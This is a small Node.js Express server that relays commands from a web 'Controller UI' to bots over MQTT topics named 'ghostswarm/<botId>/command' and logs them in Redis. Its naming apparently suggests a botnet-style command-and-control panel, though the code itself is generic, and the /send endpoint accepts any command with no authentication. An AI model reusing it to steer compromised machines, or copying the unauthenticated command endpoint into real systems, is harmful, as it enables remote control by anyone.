const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const Redis = require('ioredis');
const mqtt = require('mqtt');

const app = express();
const PORT = process.env.WEB_PORT || 3000;

const redis = new Redis({ host: process.env.REDIS_HOST || 'redis' });
const mqttClient = mqtt.connect(process.env.MQTT_BROKER_URL || 'mqtt://mqtt:1883');

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));
app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'views/index.html'));
});





app.post('/send', async (req, res) => {
   const { botId, command, payload } = req.body;

   if (!botId || !command) {
      return res.status(400).json({ error: 'botId and command required' });
   }

   const topic = `ghostswarm/${botId}/command`;
   const msg = { type: command, ...payload };

   mqttClient.publish(topic, JSON.stringify(msg), { qos: 1 }, async (err) => {
      if (err) return res.status(500).json({ error: 'MQTT publish failed' });

      await redis.lpush(`log:${botId}`, JSON.stringify({ ts: Date.now(), msg }));
      res.json({ status: 'sent', to: botId, msg });
   });
});

app.listen(PORT, () => {
   console.log(`🌐 Controller UI available at http://192.168.1.29:${PORT}`);
});
